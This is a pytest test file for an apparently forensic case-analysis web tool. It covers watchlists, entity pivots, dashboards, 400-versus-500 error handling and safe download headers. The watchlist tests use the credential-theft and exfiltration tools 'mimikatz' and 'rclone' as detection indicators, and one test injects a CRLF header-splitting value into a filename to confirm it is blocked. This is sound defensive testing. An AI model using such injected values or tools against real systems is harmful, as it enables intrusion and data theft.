    a = client.post("/api/folders", json={"name": "a"}).json()
    b = client.post("/api/folders", json={"name": "b", "parent_id": a["id"]}).json()
    assert client.post(f"/api/folders/{a['id']}/move", json={"parent_id": b["id"]}).status_code == 400


def test_folder_routes_need_the_csrf_header(store, monkeypatch):
    import server
    from fastapi.testclient import TestClient

    monkeypatch.setattr(server, "STORE", store)
    bare = TestClient(server.app)
    assert bare.post("/api/folders", json={"name": "X"}).status_code == 403


def test_case_notes_roundtrip_and_persist(client, store):
    """The case narrative lives in the .db so it travels with the case."""
    assert client.get("/api/case/notes").json()["body"] == ""
    r = client.post("/api/case/notes", json={"body": "# Lead\n- WKS07 patient zero"})
    assert r.status_code == 200
    assert r.json()["body"].startswith("# Lead")
    assert r.json()["updated_at"]
    assert "WKS07" in client.get("/api/case/notes").json()["body"]


def test_watchlist_add_scan_autotag_and_hits(client, store, write_csv):
    """Add an indicator with auto-tag, scan a table, and confirm hits are
    counted, tagged, and listable."""
    sid = store.ingest_csv(write_csv(
        [["Host", "Cmd"], ["WKS07", "rclone.exe copy"], ["WKS01", "notepad"]], "e.csv"),
        build_fts=False)["id"]
    tag = store.list_tags()[0]["id"]
    r = client.post("/api/watchlist", json={"value": "rclone", "kind": "filename", "auto_tag_id": tag})
    assert r.status_code == 200
    wid = r.json()["id"]
    scan = client.post(f"/api/watchlist/scan?source_id={sid}")
    assert scan.status_code == 200
    assert scan.json()["matched"][str(wid)] == 1
    listed = {i["value"]: i for i in client.get("/api/watchlist").json()}
    assert listed["rclone"]["hit_count"] == 1
    hits = client.get(f"/api/watchlist/hits?watchlist_id={wid}").json()
    assert hits["sources"] == [{"source_id": sid, "source_name": "e.csv", "count": 1, "shown": 1}]
    assert hits["hits"][0]["source_id"] == sid and hits["hits"][0]["rid"] == 1
    # auto-tag landed on the matching row
    n = store.db.execute("SELECT COUNT(*) c FROM row_tags WHERE source_id=? AND tag_id=?",
                         (sid, tag)).fetchone()["c"]
    assert n == 1
    # import dedupes; delete removes it and its hits
    imp = client.post("/api/watchlist/import", json={"text": "rclone\n# c\nmimikatz\n"})
    assert imp.json()["added"] == 1  # rclone already present
    client.delete(f"/api/watchlist/{wid}")
    assert all(i["value"] != "rclone" for i in client.get("/api/watchlist").json())


def test_entity_pivot_across_sources(client, store, write_csv):
    """A value found in two tables comes back with per-source counts, the
    columns it landed in, and a merged time-bucketed stream."""
    store.ingest_csv(write_csv(
        [["TimeCreated", "RemoteHost", "Computer"],
         ["2026-03-15 14:03:00", "WKS07", "FILESRV01"],
         ["2026-03-15 14:18:00", "WKS07", "DC01"]], "sec.csv"), name="sec", build_fts=False)
    store.ingest_csv(write_csv(
        [["When", "Src", "Dst"], ["2026-03-15 14:05:00", "WKS07", "8.8.8.8"]], "fw.csv"),
        name="fw", build_fts=False)
    r = client.post("/api/entity/pivot", json={"value": "WKS07"})
    assert r.status_code == 200
    out = r.json()
    byname = {s["source_name"]: s for s in out["sources"]}
    assert byname["sec"]["count"] == 2 and byname["fw"]["count"] == 1
    assert "RemoteHost" in byname["sec"]["columns"] and "Src" in byname["fw"]["columns"]
    assert len(out["rows"]) == 3
    assert out["buckets"] and out["buckets"][0][0] == "2026-03-15"
    # empty value is a 400
    assert client.post("/api/entity/pivot", json={"value": "  "}).status_code == 400


def test_dashboard_widgets_and_profile(client, store, write_csv):
    """Widget preview for each source, dashboard persistence, and a profile
    (bundle + dashboard) applying its dashboard to the case."""
    sid = store.ingest_csv(write_csv(
        [["Host", "Cmd"], ["WKS07", "rclone"], ["WKS01", "x"], ["WKS07", "y"]], "e.csv"),
        build_fts=False)["id"]
    store.set_tags(sid, [1], store.list_tags()[0]["id"], True)

    sqlw = client.post("/api/dashboard/widget/preview",
                       json={"source": "sql", "query": {"sql": f"SELECT COUNT(DISTINCT Host) h FROM src_{sid}"}})
    assert sqlw.json()["rows"] == [[2]]
    assert client.post("/api/dashboard/widget/preview", json={"source": "tags", "query": {}}).json()["total"] == 1
    assert "rows" in client.post("/api/dashboard/widget/preview", json={"source": "watchlist", "query": {}}).json()
    assert client.post("/api/dashboard/widget/preview", json={"source": "nope", "query": {}}).status_code == 400

    # create + persist a NAMED dashboard
    d = client.post("/api/dashboards", json={"name": "Board"}).json()
    w = [{"title": "Hosts", "source": "sql", "render": "stat",
          "query": {"sql": f"SELECT COUNT(*) FROM src_{sid}"}}]
    client.post(f"/api/dashboards/{d['id']}", json={"widgets": w})
    assert client.get(f"/api/dashboards/{d['id']}").json()["widgets"][0]["title"] == "Hosts"
    assert next(x for x in client.get("/api/dashboards").json() if x["id"] == d["id"])["widget_count"] == 1

    # a profile carrying a dashboard applies it as a NAMED board on apply
    prof = client.post("/api/plugin_bundles", json={"name": "KAPE triage", "plugins": [],
        "dashboard": [{"title": "Findings", "source": "tags", "render": "stat"}]})
    ap = client.post(f"/api/plugin_bundles/{prof.json()['id']}/apply")
    assert ap.status_code == 200 and ap.json()["dashboard_applied"] is True
    boards = {b["name"]: b for b in client.get("/api/dashboards").json()}
    assert "KAPE triage" in boards
    assert client.get(f"/api/dashboards/{boards['KAPE triage']['id']}").json()["widgets"][0]["title"] == "Findings"


def test_close_all_tabs_route(client, store, write_csv):
    a = store.ingest_csv(write_csv([["A"], ["1"]], "a.csv"), name="a.csv", build_fts=False)["id"]
    b = store.ingest_csv(write_csv([["A"], ["1"]], "b.csv"), name="b.csv", build_fts=False)["id"]
    assert all(s["is_open"] for s in client.get("/api/sources").json())
    r = client.post("/api/tabs/close_all")
    assert r.status_code == 200
    srcs = {s["id"]: s for s in client.get("/api/sources").json()}
    assert srcs[a]["is_open"] is False and srcs[b]["is_open"] is False


def test_quicklook_new_creates_a_temp_case_loopback_only(client, tmp_path, monkeypatch):
    import os
    import server
    monkeypatch.setattr(server, "_cases_dir", lambda: str(tmp_path))   # don't touch the real cases dir
    r = client.post("/api/case/quicklook/new")
    assert r.status_code == 200
    path = r.json()["path"]
    assert "quicklook" in path and os.path.isfile(path)   # a real, empty case file
    monkeypatch.setattr(server, "_is_loopback", lambda request: False)
    assert client.post("/api/case/quicklook/new").status_code == 403


def test_error_log_route_records_and_returns(client):
    import server
    before = client.get("/api/log").json()
    server.record_log("error", "unit-test boom")
    after = client.get("/api/log").json()
    assert after["seq"] > before["seq"]
    last = after["entries"][-1]
    assert last["message"] == "unit-test boom" and last["level"] == "error" and last["ts"]


# ------------------------------------------- the request's fault, not a 500
#
# Every one of these answered 500 ("Internal error: ...") for input the
# server simply can't act on — found by fuzzing every route. A 500 tells the
# analyst Winnow is broken and puts an error badge up; the request was the
# problem, and the status has to say so. Asserted through a client that
# does NOT re-raise server exceptions, so the status code itself is what
# each test checks.

import pytest  # noqa: E402


@pytest.fixture
def lenient(store, monkeypatch):
    import server
    from fastapi.testclient import TestClient

    monkeypatch.setattr(server, "STORE", store)
    return TestClient(server.app, headers={"X-Timeline-Lite-Client": "1"},
                      raise_server_exceptions=False)


@pytest.mark.parametrize("method,url,body", [
    ("DELETE", f"/api/source/{2 ** 63}", None),
    ("POST", f"/api/source/{-2 ** 70}/nickname", {"nickname": "x"}),
    ("GET", f"/api/layout?source_id={2 ** 70}", None),
    ("GET", f"/api/dashboards/{2 ** 63}", None),
    ("POST", "/api/note", {"source_id": 1, "rid": 2 ** 63, "note": "x"}),
    ("POST", "/api/tag_time_bounds", {"source_id": 2 ** 64}),
])
def test_an_int_past_sqlites_range_is_a_400(lenient, ingested, method, url, body):
    r = lenient.request(method, url, json=body)
    assert r.status_code == 400, r.text
    assert "out of range" in r.json()["detail"]


def test_a_missing_table_is_a_404_on_drop_validate_and_session_export(lenient, ingested):
    assert lenient.delete("/api/source/99").status_code == 404
    assert lenient.post("/api/filter/validate",
                        json={"source_id": 99, "fragment": "1=1"}).status_code == 404
    assert lenient.get("/api/session/99").status_code == 404
    up = lenient.post("/api/session/99", files={"file": ("s.json", io.BytesIO(b"{}"), "application/json")})
    assert up.status_code == 404


def test_no_case_open_is_the_400_server_md_promises(lenient, monkeypatch):
    import server
    monkeypatch.setattr(server, "STORE", None)
    r = lenient.get("/api/sources")
    assert r.status_code == 400 and r.json()["detail"] == "No case file open"


def test_flatten_paths_on_a_merge_is_refused_not_crashed(lenient, store, write_csv):
    a = store.ingest_csv(write_csv([["Doc"], ['{"a": 1}']], "a.csv"), name="a", build_fts=False)["id"]
    b = store.ingest_csv(write_csv([["Doc"], ['{"a": 2}']], "b.csv"), name="b", build_fts=False)["id"]
    mid = store.create_merge("m", [a, b])["id"]
    r = lenient.post("/api/derived/paths", json={"source_id": mid, "column": "Doc"})
    assert r.status_code == 400 and "one table at a time" in r.json()["detail"]
    # ...the member itself still flattens
    assert lenient.post("/api/derived/paths", json={"source_id": a, "column": "Doc"}).json()["kind"] == "json"
    # the post-import hint has nothing to offer a merge, rather than a 500
    r = lenient.get(f"/api/derived/suggestions?source_id={mid}")
    assert r.status_code == 200 and r.json() == []


@pytest.mark.parametrize("path", ["x", "{", "5", '{"column": "User"}', "[1, 2]"])
def test_group_summary_with_a_malformed_path_is_a_400(lenient, ingested, path):
    store, sid = ingested
    vid = store.build_view(sid, {})["view_id"]
    r = lenient.get("/api/group_summary", params={"view_id": vid, "column": "User", "path": path})
    assert r.status_code == 400, r.text


@pytest.mark.parametrize("exclude", [[[1]], [[]], [[1, 2, 3]], [["a", "b"]]])
def test_tag_view_with_a_malformed_exclude_pair_is_refused(lenient, ingested, exclude):
    store, sid = ingested
    vid = store.build_view(sid, {})["view_id"]
    tag_id = store.list_tags()[0]["id"]
    r = lenient.post("/api/row_tags/view", json={"view_id": vid, "tag_id": tag_id, "exclude": exclude})
    assert r.status_code == 422, r.text
    assert store.tag_counts(sid)["counts"] == {}     # and nothing was tagged


_WRONG_SHAPES = [[], "x", 5, None, {"filters": "x"}, {"filters": [1, "a", None]},
                 {"filters": [{"col_names": [1]}]},
                 {"format": "winnow-case-session/1", "sources": "x"},
                 {"format": "winnow-case-session/1", "sources": [1]},
                 {"format": "winnow-case-session/1", "sources": [{"row_tags": [{"rid": "x", "tag_id": 1}]}]},
                 {"row_tags": "x"}, {"row_tags": [{"rid": 10 ** 30, "tag_id": 1}]},
                 {"tag_defs": [{"id": 1, "name": None}]}, {"source": []}]


@pytest.mark.parametrize("doc", _WRONG_SHAPES)
def test_imports_of_a_wrong_shape_document_are_a_400(lenient, ingested, doc):
    store, sid = ingested

    def upload(url):
        return lenient.post(url, files={"file": ("f.json", io.BytesIO(json.dumps(doc).encode()),
                                                 "application/json")})

    for r in (upload("/api/saved_filters/import"), upload(f"/api/session/{sid}"),
              upload("/api/case_session"),
              lenient.post("/api/case_sessions/adopt", json={"name": "z", "session": doc})):
        assert r.status_code < 500, r.text


def test_a_case_session_is_checked_whole_before_any_table_is_written(lenient, ingested):
    store, sid = ingested
    good = store.export_case_session()
    tag = store.list_tags()[0]
    good["sources"][0]["row_tags"] = [{"rid": 1, "tag_id": tag["id"]}]
    good["sources"][0]["tag_defs"] = [tag]
    bad = json.loads(json.dumps(good["sources"][0]))
    bad["row_notes"] = [{"rid": "one", "note": "x"}]
    good["sources"].append(bad)
    r = lenient.post("/api/case_session", files={"file": ("s.json", io.BytesIO(json.dumps(good).encode()),
                                                          "application/json")})
    assert r.status_code == 400 and "sources[1]" in r.json()["detail"]
    assert store.tag_counts(sid)["counts"] == {}      # the first, valid table was not applied either


def test_creating_a_case_under_a_file_is_a_400(lenient, tmp_path):
    blocker = tmp_path / "afile"
    blocker.write_text("x")
    r = lenient.post("/api/cases", json={"path": str(blocker / "case.db-winnow"), "name": "c"})
    assert r.status_code == 400 and "Could not create case file" in r.json()["detail"]


def test_new_folder_with_a_nul_in_its_name_is_a_400(lenient, tmp_path):
    r = lenient.post("/api/browse_dir/new", json={"parent": str(tmp_path), "name": "a\x00b"})
    assert r.status_code == 400, r.text


def test_dashboard_widget_with_bad_sql_or_a_string_query_is_the_analysts_400(lenient, ingested):
    r = lenient.post("/api/dashboard/widget/preview",
                     json={"source": "sql", "query": {"sql": "SELECT nope FROM nowhere"}})
    assert r.status_code == 400 and "nowhere" in r.json()["detail"]
    # inside a signals grid a bad cell fails ALONE, in its own place
    r = lenient.post("/api/dashboard/widget/preview", json={
        "source": "cells", "query": {},
        "cells": [{"label": "bad", "source": "sql", "query": "SELECT 1"},
                  {"label": "good", "source": "sql", "query": {"sql": "SELECT 7"}}]})
    assert r.status_code == 200, r.text
    out = r.json()
    assert out["rows"] == [["bad", None], ["good", 7]]
    assert out["cell_errors"][0] and out["cell_errors"][1] is None


def test_a_table_still_importing_is_a_400_on_rows_maxlen_and_search(lenient, ingested):
    store, sid = ingested
    vid = store.build_view(sid, {})["view_id"]
    with store.lock, store.db:   # what every ingest path looks like before its columns land
        store.db.execute("UPDATE sources SET columns='[]' WHERE id=?", (sid,))
    r = lenient.get("/api/rows", params={"view_id": vid, "start": 0, "count": 10})
    assert r.status_code == 400 and "still importing" in r.json()["detail"]
    r = lenient.get("/api/column_maxlen", params={"source_id": sid})
    assert r.status_code == 400 and "still importing" in r.json()["detail"]
    for spec in ({"search": "abc"}, {"search": "a.c", "search_mode": "regex"},
                 {"search_mode": "advanced", "search_terms": [{"term": "abc"}]}):
        r = lenient.post("/api/view", json={"source_id": sid, **spec})
        assert r.status_code == 400 and "still importing" in r.json()["detail"], (spec, r.text)


def _disposition_name(header: str) -> str:
    """The filename a browser takes from a Content-Disposition: the RFC
    6266 `filename*` (UTF-8, percent-encoded) when present, else the plain
    quoted `filename`."""
    import re
    from urllib.parse import unquote
    m = re.search(r"filename\*=UTF-8''([^;\s]+)", header, re.I)
    if m:
        return unquote(m.group(1))
    return re.search(r'filename="([^"]*)"', header).group(1)


def test_downloads_take_any_filename_rather_than_500(client, store, write_csv):
    """A Content-Disposition built by f-string is encoded Latin-1 by the
    server, so one en dash or Cyrillic letter in a download name — the SQL
    tab's name, a source's file name, what the analyst typed — was a 500
    and no file. Every download header now carries the name as RFC 6266
    `filename*` with an ASCII fallback beside it."""
    names = ["Подозрительные процессы", "lateral – summary", 'quote " and \\ back']
    sid = store.ingest_csv(write_csv([["a"], ["1"]], "журнал_событий.csv"),
                           name="журнал_событий.csv", build_fts=False)["id"]
    store.set_tags(sid, [1], store.list_tags()[0]["id"], True)
    view = store.build_view(sid, {"source_id": sid, "filters": [], "sort": []})["view_id"]
    held = client.post("/api/sql/run", json={"sql": "SELECT 1 AS a"}).json()["id"]

    for base in names:
        responses = {
            "sql xlsx": client.get(f"/api/sql/result/{held}/export.xlsx",
                                   params={"filename": base + ".xlsx", "sheet": "Query"}),
            "sql csv": client.get(f"/api/sql/result/{held}/export.csv", params={"filename": base + ".csv"}),
            "view csv": client.get("/api/export", params={"view_id": view, "filename": base + ".csv"}),
            "tagged xlsx": client.get("/api/export/tagged_xlsx", params={"filename": base + ".xlsx"}),
            "all xlsx": client.get("/api/export/all_xlsx", params={"filename": base + ".xlsx"}),
        }
        for what, r in responses.items():
            assert r.status_code == 200, (what, base, r.text[:200])
            header = r.headers["content-disposition"]
            assert header.startswith("attachment;")
            assert _disposition_name(header) in (base + ".xlsx", base + ".csv"), (what, header)
            # The fallback is plain ASCII with nothing that ends the quoted string early.
            fallback = header.split('filename="', 1)[1].split('"', 1)[0]
            assert fallback.isascii() and "\\" not in fallback

    r = client.get(f"/api/session/{sid}")
    assert r.status_code == 200
    assert _disposition_name(r.headers["content-disposition"]) == "журнал_событий.tls.json"


def test_a_download_name_cannot_split_the_header(client, store, write_csv):
    """CR/LF in a typed name would end the header line (uvicorn refuses
    the response outright); the name keeps its text, never its line break."""
    held = client.post("/api/sql/run", json={"sql": "SELECT 1 AS a"}).json()["id"]
    r = client.get(f"/api/sql/result/{held}/export.xlsx",
                   params={"filename": "a\r\nSet-Cookie: x=1.xlsx", "sheet": "Q"})
    assert r.status_code == 200
    header = r.headers["content-disposition"]
    assert "\r" not in header and "\n" not in header
    assert "set-cookie" not in r.headers


def test_a_stale_delete_with_file_never_deletes_another_case(client, tmp_path):
    """A home screen's list can be older than the registry: another window
    forgot case B and registered a new one. With registry ids reused, the
    new case took B's id, and the stale window's "Delete with file" on B
    deleted the new case's file. The client now says which file it means,
    and a mismatch touches nothing."""
    from winnow.store import Store

    paths = {}
    for name in ("A", "B", "NewHost"):
        paths[name] = str(tmp_path / f"{name}.db-winnow")
    a = client.post("/api/cases", json={"path": paths["A"], "name": "A"}).json()
    b = client.post("/api/cases", json={"path": paths["B"], "name": "B"}).json()
    assert client.delete(f"/api/cases/{b['id']}").status_code == 200       # window 2 forgets B
    new = client.post("/api/cases", json={"path": paths["NewHost"], "name": "NewHost"}).json()
    Store(paths["NewHost"]).close()                                          # a real case file on disk
    assert new["id"] != b["id"]

    # Window 1, still listing B under its old id, asks to delete B's file.
    r = client.delete(f"/api/cases/{b['id']}", params={"delete_file": "true", "path": paths["B"]})
    assert r.status_code == 200
    assert (tmp_path / "NewHost.db-winnow").exists()

    # And when an id does name another case than the one meant, nothing happens.
    r = client.delete(f"/api/cases/{new['id']}", params={"delete_file": "true", "path": paths["A"]})
    assert r.status_code == 409
    assert (tmp_path / "NewHost.db-winnow").exists()
    assert {c["id"] for c in client.get("/api/cases").json()} >= {a["id"], new["id"]}
